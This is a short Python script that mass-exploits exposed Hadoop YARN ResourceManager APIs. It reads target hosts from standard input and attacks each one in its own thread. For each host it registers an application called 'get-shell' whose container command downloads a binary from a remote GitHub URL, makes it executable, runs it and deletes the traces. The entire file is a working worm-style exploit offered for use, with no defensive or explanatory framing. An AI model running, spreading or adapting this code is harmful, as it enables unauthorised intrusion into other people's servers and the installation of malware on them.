import sys
import threading
import requests
import os

cmd = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/client; chmod 777 *; ./client; rm -rf *"

def rtek(host):
    try:
        url = f'http://{host}:8088/ws/v1/cluster/apps/new-application'
        resp = requests.post(url, timeout=3)
        app_id = resp.json().get('application-id')
        if app_id:
            url = f'http://{host}:8088/ws/v1/cluster/apps'
            data = {
                'application-id': app_id,
                'application-name': 'get-shell',
                'am-container-spec': {
                    'commands': {
                        'command': cmd,
                    },
                },
                'application-type': 'YARN',
            }
            requests.post(url, json=data, timeout=3)
            print(f"[+]: {host}")
    except Exception:
        pass

def main():
    try:
        for line in sys.stdin:
            host = line.strip()
            thread = threading.Thread(target=rtek, args=(host,))
            thread.start()
    except KeyboardInterrupt:
        os._exit(0)

if __name__ == "__main__":
    main()
